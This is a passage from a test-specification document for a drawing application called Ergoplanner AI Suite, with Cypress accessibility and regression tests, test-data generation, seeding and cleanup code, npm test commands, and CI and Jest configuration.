    cy.realPress(['Control', 's']); // Save
    cy.get('[data-testid="save-dialog"]').should('be.visible');
    cy.realPress('Escape'); // Close dialog

    cy.realPress(['Control', 'z']); // Undo
    cy.get('[role="status"]').should('contain', 'Undo performed');

    cy.realPress(['Control', 'Shift', 'z']); // Redo
    cy.get('[role="status"]').should('contain', 'Redo performed');
  });
});
```

### 6.4 Color Contrast Validation

```javascript
describe('Color Contrast Tests', () => {
  it('should meet WCAG AA contrast requirements', () => {
    cy.visit('/drawings/new');
    cy.injectAxe();

    // Check for contrast violations
    cy.checkA11y(null, {
      rules: {
        'color-contrast': { enabled: true },
      },
    }, (violations) => {
      if (violations.length > 0) {
        const contrastViolations = violations.filter(v => v.id === 'color-contrast');
        expect(contrastViolations).to.have.length(0,
          `Found ${contrastViolations.length} contrast violations`);
      }
    });
  });

  it('should maintain contrast in dark mode', () => {
    cy.get('[data-testid="theme-toggle"]').click();
    cy.get('body').should('have.class', 'dark-mode');

    // Re-check contrast in dark mode
    cy.checkA11y(null, {
      rules: {
        'color-contrast': { enabled: true },
      },
    });
  });
});
```

### 6.5 Focus Management Testing

```javascript
describe('Focus Management', () => {
  it('should trap focus in modal dialogs', () => {
    cy.visit('/drawings/new');
    cy.get('[data-testid="export-btn"]').click();

    // Check focus is trapped
    cy.focused().should('have.attr', 'data-testid', 'export-format-select');

    // Tab through modal elements
    cy.realPress('Tab');
    cy.focused().should('have.attr', 'data-testid', 'export-quality-select');

    cy.realPress('Tab');
    cy.focused().should('have.attr', 'data-testid', 'export-confirm-btn');

    cy.realPress('Tab');
    cy.focused().should('have.attr', 'data-testid', 'export-cancel-btn');

    // Should cycle back to first element
    cy.realPress('Tab');
    cy.focused().should('have.attr', 'data-testid', 'export-format-select');
  });

  it('should restore focus after dialog closes', () => {
    const triggerButton = '[data-testid="export-btn"]';

    cy.get(triggerButton).click();
    cy.get('[data-testid="export-dialog"]').should('be.visible');

    cy.get('[data-testid="export-cancel-btn"]').click();
    cy.focused().should('match', triggerButton);
  });
});
```

---

## 7. Regression Test Suite

### 7.1 Critical Path Test Cases

```javascript
// Critical Path Tests - Must Pass for Release
describe('Critical Path Tests @critical', () => {
  it('CP-001: User can login successfully', () => {
    cy.visit('/login');
    cy.get('#email').type('user@ergoplanner.com');
    cy.get('#password').type('ValidPass123!');
    cy.get('[data-testid="login-btn"]').click();
    cy.url().should('include', '/dashboard');
    cy.get('[data-testid="user-menu"]').should('contain', 'user@ergoplanner.com');
  });

  it('CP-002: User can create and save drawing', () => {
    cy.login();
    cy.visit('/drawings/new');
    cy.addComponent('pump', { x: 100, y: 100 });
    cy.saveDrawing('Critical Path Test');
    cy.get('[data-testid="save-success"]').should('be.visible');
  });

  it('CP-003: Drawing persists after reload', () => {
    const drawingId = 'test-drawing-123';
    cy.createDrawing(drawingId);
    cy.reload();
    cy.get('[data-testid="component-pump-1"]').should('exist');
  });

  it('CP-004: BoQ generates correctly', () => {
    cy.loadDrawing('sample-drawing');
    cy.get('[data-testid="generate-boq"]').click();
    cy.get('[data-testid="boq-table"]').should('be.visible');
    cy.get('[data-testid="boq-total"]').should('not.be.empty');
  });

  it('CP-005: Export to PDF works', () => {
    cy.loadDrawing('sample-drawing');
    cy.exportDrawing('pdf');
    cy.readFile('cypress/downloads/sample-drawing.pdf').should('exist');
  });
});
```

### 7.2 Smoke Test Scenarios

```javascript
// Smoke Tests - Quick Sanity Check (< 5 minutes)
describe('Smoke Tests @smoke', () => {
  const smokeTests = [
    { name: 'Application loads', url: '/', element: '[data-testid="app-root"]' },
    { name: 'Login page accessible', url: '/login', element: '#email' },
    { name: 'Dashboard loads', url: '/dashboard', element: '[data-testid="project-list"]' },
    { name: 'Drawing canvas renders', url: '/drawings/new', element: '[data-testid="canvas"]' },
    { name: 'Symbol library loads', url: '/drawings/new', element: '[data-testid="symbol-library"]' },
    { name: 'API health check', url: '/api/health', status: 200 },
  ];

  smokeTests.forEach(test => {
    it(`SMOKE-${test.name}`, () => {
      if (test.status) {
        cy.request(test.url).its('status').should('eq', test.status);
      } else {
        cy.visit(test.url);
        cy.get(test.element, { timeout: 10000 }).should('be.visible');
      }
    });
  });
});
```

### 7.3 Test Prioritization Matrix

| Priority | Category | Frequency | Duration | Coverage |
|----------|----------|-----------|----------|----------|
| P0 - Critical | Core functionality, Security | Every commit | < 5 min | Login, Save, Load, Export |
| P1 - High | Major features | Every PR | < 15 min | All CRUD operations |
| P2 - Medium | Integration tests | Daily | < 30 min | API, WebSocket, Collaboration |
| P3 - Low | Edge cases | Weekly | < 1 hour | Browser compat, Performance |

### 7.4 Automated vs Manual Test Allocation

| Test Type | Automated | Manual | Hybrid |
|-----------|-----------|--------|--------|
| Unit Tests | 100% | 0% | - |
| Integration Tests | 90% | 10% | - |
| E2E Tests | 80% | 20% | - |
| Performance Tests | 95% | 5% | - |
| Security Tests | 70% | 30% | - |
| Accessibility Tests | 60% | 40% | - |
| Usability Tests | 10% | 90% | - |
| Exploratory Tests | 0% | 100% | - |

---

## 8. Test Data Management

### 8.1 Test Data Generation Strategies

```javascript
// Faker-based Test Data Generator
class TestDataGenerator {
  generateProject(overrides = {}) {
    return {
      id: faker.datatype.uuid(),
      name: faker.company.name() + ' ' + faker.lorem.word(),
      type: faker.helpers.arrayElement(['P&ID', 'PFD', 'Isometric']),
      client: faker.company.name(),
      status: faker.helpers.arrayElement(['Draft', 'Review', 'Approved']),
      createdAt: faker.date.past(),
      drawings: this.generateDrawings(faker.datatype.number({ min: 1, max: 5 })),
      ...overrides
    };
  }

  generateDrawings(count = 1) {
    return Array.from({ length: count }, () => ({
      id: faker.datatype.uuid(),
      name: faker.system.fileName(),
      revision: faker.system.semver(),
      components: this.generateComponents(faker.datatype.number({ min: 10, max: 50 })),
      connections: this.generateConnections(faker.datatype.number({ min: 5, max: 20 }))
    }));
  }

  generateComponents(count = 10) {
    const types = ['PUMP', 'VALVE', 'TANK', 'PIPE', 'INSTRUMENT'];
    return Array.from({ length: count }, (_, i) => ({
      id: `comp-${i}`,
      type: faker.helpers.arrayElement(types),
      tag: faker.random.alphaNumeric(3).toUpperCase() + '-' + faker.datatype.number({ min: 100, max: 999 }),
      position: {
        x: faker.datatype.number({ min: 0, max: 1000 }),
        y: faker.datatype.number({ min: 0, max: 800 })
      },
      properties: this.generateProperties(faker.helpers.arrayElement(types))
    }));
  }

  generateProperties(type) {
    const baseProperties = {
      manufacturer: faker.company.name(),
      model: faker.vehicle.model(),
      material: faker.helpers.arrayElement(['CS', 'SS316', 'SS304', 'PVC'])
    };

    switch(type) {
      case 'PUMP':
        return {
          ...baseProperties,
          flowRate: faker.datatype.number({ min: 10, max: 500 }),
          head: faker.datatype.number({ min: 10, max: 100 }),
          power: faker.datatype.number({ min: 1, max: 50 })
        };
      case 'VALVE':
        return {
          ...baseProperties,
          size: faker.helpers.arrayElement(['DN50', 'DN80', 'DN100', 'DN150']),
          type: faker.helpers.arrayElement(['Ball', 'Gate', 'Globe', 'Butterfly']),
          pressure: faker.datatype.number({ min: 10, max: 40 })
        };
      default:
        return baseProperties;
    }
  }
}
```

### 8.2 Data Privacy Compliance

```javascript
// PII Data Sanitization
class TestDataSanitizer {
  sanitizeUserData(userData) {
    return {
      ...userData,
      email: this.anonymizeEmail(userData.email),
      name: this.anonymizeName(userData.name),
      phone: this.anonymizePhone(userData.phone),
      address: this.anonymizeAddress(userData.address),
      ssn: undefined, // Remove sensitive fields
      creditCard: undefined,
      dateOfBirth: this.anonymizeDate(userData.dateOfBirth)
    };
  }

  anonymizeEmail(email) {
    const [localPart, domain] = email.split('@');
    const anonymized = localPart.substring(0, 2) + '****';
    return `${anonymized}@${domain}`;
  }

  anonymizeName(name) {
    const parts = name.split(' ');
    return parts.map(part => part[0] + '***').join(' ');
  }

  anonymizePhone(phone) {
    return phone.replace(/\d(?=\d{4})/g, '*');
  }

  anonymizeAddress(address) {
    return {
      ...address,
      street: '*** Test Street',
      number: '***'
    };
  }

  anonymizeDate(date) {
    const d = new Date(date);
    return new Date(d.getFullYear(), 0, 1); // Keep only year
  }
}
```

### 8.3 Test Database Seeding

```javascript
// Database Seeder
class TestDatabaseSeeder {
  async seed(options = {}) {
    const config = {
      users: options.users || 10,
      projects: options.projects || 5,
      drawings: options.drawings || 20,
      components: options.components || 500,
      ...options
    };

    // Clear existing data
    await this.clearDatabase();

    // Seed in correct order (respecting foreign keys)
    const users = await this.seedUsers(config.users);
    const projects = await this.seedProjects(config.projects, users);
    const drawings = await this.seedDrawings(config.drawings, projects);
    const components = await this.seedComponents(config.components, drawings);

    return {
      users,
      projects,
      drawings,
      components
    };
  }

  async clearDatabase() {
    // Disable foreign key checks
    await db.raw('SET FOREIGN_KEY_CHECKS = 0');

    // Truncate tables in reverse order
    const tables = [
      'component_history',
      'component_connections',
      'components',
      'drawing_revisions',
      'drawings',
      'project_members',
      'projects',
      'user_sessions',
      'users'
    ];

    for (const table of tables) {
      await db(table).truncate();
    }

    // Re-enable foreign key checks
    await db.raw('SET FOREIGN_KEY_CHECKS = 1');
  }

  async seedUsers(count) {
    const users = [];

    // Create fixed test users
    users.push(
      await this.createUser({
        email: 'admin@test.com',
        role: 'admin',
        password: 'TestAdmin123!'
      }),
      await this.createUser({
        email: 'engineer@test.com',
        role: 'engineer',
        password: 'TestEngineer123!'
      }),
      await this.createUser({
        email: 'viewer@test.com',
        role: 'viewer',
        password: 'TestViewer123!'
      })
    );

    // Create random users
    for (let i = 0; i < count - 3; i++) {
      users.push(await this.createUser());
    }

    return users;
  }

  async createUser(overrides = {}) {
    const userData = {
      id: faker.datatype.uuid(),
      email: faker.internet.email(),
      name: faker.name.fullName(),
      role: faker.helpers.arrayElement(['engineer', 'viewer']),
      password: await bcrypt.hash('TestPassword123!', 10),
      created_at: faker.date.past(),
      ...overrides
    };

    await db('users').insert(userData);
    return userData;
  }
}
```

### 8.4 Data Cleanup Procedures

```javascript
// Test Data Cleanup Manager
class TestDataCleanup {
  constructor() {
    this.cleanupTasks = [];
    this.fileCleanupPaths = [];
  }

  registerCleanup(task) {
    this.cleanupTasks.push(task);
  }

  registerFile(filePath) {
    this.fileCleanupPaths.push(filePath);
  }

  async cleanup() {
    // Clean database
    await this.cleanDatabase();

    // Clean files
    await this.cleanFiles();

    // Clean cache
    await this.cleanCache();

    // Execute custom cleanup tasks
    for (const task of this.cleanupTasks) {
      await task();
    }

    // Reset
    this.cleanupTasks = [];
    this.fileCleanupPaths = [];
  }

  async cleanDatabase() {
    // Delete test data (identified by test prefix)
    await db('components').where('tag', 'like', 'TEST_%').delete();
    await db('drawings').where('name', 'like', 'Test%').delete();
    await db('projects').where('name', 'like', 'Test%').delete();
    await db('users').where('email', 'like', '%@test.com').delete();
  }

  async cleanFiles() {
    const fs = require('fs').promises;

    for (const path of this.fileCleanupPaths) {
      try {
        await fs.unlink(path);
      } catch (error) {
        console.warn(`Failed to delete ${path}:`, error.message);
      }
    }

    // Clean test upload directory
    const testUploadsDir = './uploads/test';
    try {
      await fs.rmdir(testUploadsDir, { recursive: true });
    } catch (error) {
      // Directory might not exist
    }
  }

  async cleanCache() {
    // Clear Redis test keys
    const redis = require('./redis');
    const keys = await redis.keys('test:*');

    if (keys.length > 0) {
      await redis.del(...keys);
    }
  }
}

// Usage in test hooks
beforeEach(async () => {
  cleanup = new TestDataCleanup();
  seeder = new TestDatabaseSeeder();
  testData = await seeder.seed({ users: 5, projects: 2 });
});

afterEach(async () => {
  await cleanup.cleanup();
});
```

---

## Test Execution Commands

### Running Tests

```bash
# Unit Tests
npm run test:unit                    # Run all unit tests
npm run test:unit:watch             # Watch mode
npm run test:unit:coverage          # With coverage report

# Integration Tests
npm run test:integration            # Run all integration tests
npm run test:integration:api        # API tests only
npm run test:integration:db         # Database tests only

# E2E Tests
npm run test:e2e                    # Run all E2E tests
npm run test:e2e:headed             # Run in headed mode
npm run test:e2e:smoke              # Smoke tests only
npm run test:e2e:critical           # Critical path only

# Performance Tests
npm run test:performance            # Run performance suite
npm run test:load                   # Load tests
npm run test:stress                 # Stress tests

# Security Tests
npm run test:security               # Full security suite
npm run test:security:owasp         # OWASP Top 10
npm run test:security:penetration   # Penetration tests

# Accessibility Tests
npm run test:a11y                   # Accessibility tests
npm run test:a11y:wcag              # WCAG compliance

# Full Test Suite
npm run test:all                    # Run everything
npm run test:regression             # Regression suite
npm run test:ci                     # CI/CD optimized suite
```

### CI/CD Integration

```yaml
# GitHub Actions Example
name: Test Suite

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest

    strategy:
      matrix:
        test-suite: [unit, integration, e2e, performance, security, a11y]

    steps:
      - uses: actions/checkout@v3

      - name: Setup Node
        uses: actions/setup-node@v3
        with:
          node-version: '18'
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Run ${{ matrix.test-suite }} tests
        run: npm run test:${{ matrix.test-suite }}
        env:
          CI: true

      - name: Upload coverage
        if: matrix.test-suite == 'unit'
        uses: codecov/codecov-action@v3
        with:
          file: ./coverage/lcov.info

      - name: Upload test results
        if: always()
        uses: actions/upload-artifact@v3
        with:
          name: test-results-${{ matrix.test-suite }}
          path: |
            test-results/
            coverage/
            screenshots/
```

---

## Test Reporting Configuration

### Jest Configuration

```javascript
// jest.config.js
module.exports = {
  testEnvironment: 'node',
  coverageDirectory: 'coverage',
  coverageReporters: ['text', 'lcov', 'html'],
  coverageThreshold: {
    global: {
      branches: 80,
      functions: 80,
      lines: 80,
      statements: 80
    },
    './src/core/': {
      branches: 90,
      functions: 90,
      lines: 90,
      statements: 90
    }
  },
  reporters: [
    'default',
    ['jest-html-reporter', {
      pageTitle: 'Ergoplanner Test Report',
      outputPath: 'test-results/test-report.html',
      includeFailureMsg: true,
      includeConsoleLog: true
    }],
    ['jest-junit', {
      outputDirectory: 'test-results',
      outputName: 'junit.xml'
    }]
  ],
  testMatch: [
    '**/__tests__/**/*.test.[jt]s?(x)',
    '**/?(*.)+(spec|test).[jt]s?(x)'
  ]
};
```

---

## Conclusion

This comprehensive test specifications document provides detailed guidelines, test cases, and implementation examples for ensuring the quality and reliability of the Ergoplanner AI Suite. All test specifications should be regularly reviewed and updated as the application evolves, maintaining alignment with business requirements and technical architecture.

The test suite implementation should follow these specifications to achieve optimal test coverage, performance, and maintainability while ensuring the application meets all functional, non-functional, and compliance requirements.